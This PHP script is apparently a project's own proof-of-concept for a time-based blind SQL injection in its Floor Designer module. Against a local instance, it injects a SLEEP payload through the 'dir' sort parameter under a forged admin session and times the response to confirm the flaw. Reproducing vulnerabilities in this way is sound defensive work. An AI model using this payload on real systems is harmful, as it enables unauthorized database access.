<?php
/**
 * PoC for SQL Injection in Floor Designer via 'dir' parameter.
 */
define('ITM_CLI_SCRIPT', true);
putenv('DB_HOST=127.0.0.1');
putenv('DB_USER=root');
putenv('DB_PASS=itmanagement');
putenv('DB_NAME=itmanagement');
require_once __DIR__ . '/../../../config/config.php';
require_once __DIR__ . '/../../../scripts/lib/itm_script_test_employee.php';

$company_id = 1;
if (!$conn) {
    die("No database connection\n");
}
echo "Database connection established\n";
$testUser = itm_script_test_employee_create($conn, $company_id, ['script_slug' => 'repro-floor-sqli']);
if (!is_array($testUser)) {
    echo "Failed to create test user via itm_script_test_employee_create\n";
    $res = mysqli_query($conn, "SELECT id, username FROM employees WHERE id = 1");
    $testUser = mysqli_fetch_assoc($res);
    echo "Using existing user: " . $testUser['username'] . "\n";
}
itm_script_test_employee_register_teardown($conn, (int)$testUser['id']);

$_SESSION['company_id'] = $company_id;
$_SESSION['employee_id'] = $testUser['id'];
$_SESSION['username'] = $testUser['username'];
$_SESSION['role_name'] = 'admin';

echo "Testing SQL Injection in modules/floor_designer/index.php\n";

$start = microtime(true);
$payload = "ASC, (SELECT 1 FROM (SELECT(SLEEP(2)))a)";
$_GET['dir'] = $payload;
$_SERVER['REQUEST_METHOD'] = 'GET';
$_SERVER['PHP_SELF'] = '/it-management/modules/floor_designer/index.php';

chdir(__DIR__ . '/../../../modules/floor_designer');
ob_start();
include 'index.php';
ob_end_clean();

$end = microtime(true);
$duration = $end - $start;
echo "Request took: " . round($duration, 2) . " seconds\n";

if ($duration >= 2) {
    echo "VULNERABILITY CONFIRMED: SQL Injection via 'dir' parameter successful.\n";
} else {
    echo "SQL Injection attempt failed or was blocked.\n";
}
